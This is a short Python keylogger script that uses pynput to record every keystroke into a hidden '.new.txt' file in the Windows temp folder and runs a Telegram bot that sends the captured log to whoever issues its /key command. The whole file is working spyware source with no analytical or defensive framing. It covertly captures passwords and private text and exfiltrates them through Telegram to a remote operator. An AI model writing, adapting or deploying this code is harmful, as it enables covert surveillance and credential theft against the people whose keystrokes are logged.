import subprocess,threading
from pynput.keyboard import  Listener
from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

log_dir = f'{subprocess.check_output("echo %TEMP%",shell=True).decode()}'
log_dir=log_dir.strip()+"\\.new.txt"

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("type /key to print log of your key logger")

async def logkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    data=""
    with open(log_dir,"r") as f:
            data=f.read()
    await update.message.reply_text(data)

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    return


def parse(key): 
        if(".enter" in str(key).lower()):
            with open(log_dir,"a+") as f:
                f.write("\n")

            
        elif(".space" in str(key).lower()):

            with open(log_dir,"a+") as f:
                f.write(" ")
        elif("key" in str(key).lower()):
                with open(log_dir,"a+") as f:
                        f.write(f" [{str(key).replace('Key.','')}] ")
        else:
            with open(log_dir,"a+") as f:
                f.write(f"{str(key.char)}")
        
   

def on_press(key):
    try:
       parse(key)
    except Exception as e:
      with open(log_dir,"a+") as f:
                f.write(f"\n[ERROR]: {e}")
def start_key():
     with Listener(on_press=on_press) as listener:
        listener.join()

def main() -> None:
    application = Application.builder().token("Token").build()

    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("key", logkey))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
    ithread=threading.Thread(target=start_key)
    ithread.start()
    application.run_polling(allowed_updates=Update.ALL_TYPES)
if __name__ == "__main__":
    main()